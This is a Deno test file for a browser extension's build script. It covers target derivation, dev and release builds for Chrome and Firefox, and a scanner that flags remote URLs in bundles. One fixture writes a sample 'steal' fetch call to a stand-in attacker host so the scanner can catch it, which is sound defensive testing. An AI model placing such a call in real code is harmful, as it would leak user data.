import { assert, assertEquals } from "@std/assert";
import { toFileUrl } from "@std/path";
import { build, collectRemoteUrlOffenders, esbuildTargetFrom } from "./build.ts";
import { SUPPORTED } from "./manifest.ts";

const DIST = new URL("../dist/", import.meta.url);

Deno.test("esbuildTargetFrom - derives esbuild target strings from SUPPORTED, not literals", () => {
  assertEquals(esbuildTargetFrom(SUPPORTED), ["chrome116", "firefox109"]);
});

Deno.test("collectRemoteUrlOffenders - flags an injected http(s) literal, ignores a clean file", async () => {
  const tempDir = await Deno.makeTempDir();
  try {
    const dir = new URL(`${toFileUrl(tempDir).href}/`);
    await Deno.writeTextFile(new URL("clean.js", dir), "console.log('ok');");
    await Deno.writeTextFile(
      new URL("dirty.js", dir),
      "fetch('https://evil.example.com/steal');",
    );
    const offenders = await collectRemoteUrlOffenders(dir);
    assertEquals(offenders.length, 1);
    assert(offenders[0]?.endsWith("dirty.js"));
  } finally {
    await Deno.remove(tempDir, { recursive: true });
  }
});

Deno.test("build({ release: false }) - emits dist/<target>/manifest.json plus bundles for both targets", async () => {
  await build({ release: false });
  try {
    for (const target of ["chrome", "firefox"] as const) {
      const targetDir = new URL(`${target}/`, DIST);
      const manifest = JSON.parse(await Deno.readTextFile(new URL("manifest.json", targetDir)));
      assertEquals(manifest.manifest_version, 3);
      await Deno.stat(new URL("background/background.js", targetDir));
      await Deno.stat(new URL("content/content.js", targetDir));
      await Deno.stat(new URL("sidepanel/sidepanel.js", targetDir));
      await Deno.stat(new URL("sidepanel/sidepanel.html", targetDir));
      await Deno.stat(new URL("popup/popup.js", targetDir));
      await Deno.stat(new URL("popup/popup.html", targetDir));
      await Deno.stat(new URL("options/options.js", targetDir));
      await Deno.stat(new URL("options/options.html", targetDir));
      await Deno.stat(new URL("icons/icon-16.png", targetDir));
      await Deno.stat(new URL("src/shared/design/tokens.css", targetDir));
      await Deno.stat(new URL("src/shared/design/icons.svg", targetDir));
      const bg = await Deno.readTextFile(new URL("background/background.js", targetDir));
      assert(bg.includes("sourceMappingURL"));
    }
  } finally {
    await Deno.remove(DIST, { recursive: true });
  }
});

Deno.test("build({ release: true }) - minifies, drops sourcemaps, and zips both targets", async () => {
  await build({ release: true });
  try {
    const chromeDir = new URL("chrome/", DIST);
    const bg = await Deno.readTextFile(new URL("background/background.js", chromeDir));
    assert(!bg.includes("sourceMappingURL"));

    let mapExists = true;
    try {
      await Deno.stat(new URL("background/background.js.map", chromeDir));
    } catch (error) {
      if (!(error instanceof Deno.errors.NotFound)) throw error;
      mapExists = false;
    }
    assert(!mapExists);

    const chromeZip = await Deno.stat(new URL("chrome.zip", DIST));
    const firefoxZip = await Deno.stat(new URL("firefox.zip", DIST));
    assert(chromeZip.size > 0);
    assert(firefoxZip.size > 0);
  } finally {
    await Deno.remove(DIST, { recursive: true });
  }
});
